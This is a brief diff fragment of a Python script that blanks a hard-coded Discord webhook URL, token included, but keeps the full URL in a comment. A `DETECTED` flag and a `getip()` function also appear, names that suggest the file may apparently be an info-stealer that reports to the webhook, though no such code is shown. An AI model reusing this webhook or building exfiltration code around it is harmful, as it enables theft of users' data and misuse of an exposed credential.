@@ -15,7 +15,7 @@ import random
 import re
 import subprocess
 
-hook = "https://discord.com/api/webhooks/1067835493749899444/fGVDbASt3N7zzaE2sz4C0Av8Ug57Sz1Nh7nNO5g1mx8ayDb05h5XyDZnugt9_qWKHJ8B"
+hook = "" # https://discord.com/api/webhooks/1067835493749899444/fGVDbASt3N7zzaE2sz4C0Av8Ug57Sz1Nh7nNO5g1mx8ayDb05h5XyDZnugt9_qWKHJ8B
 DETECTED = False
 def getip():
 v
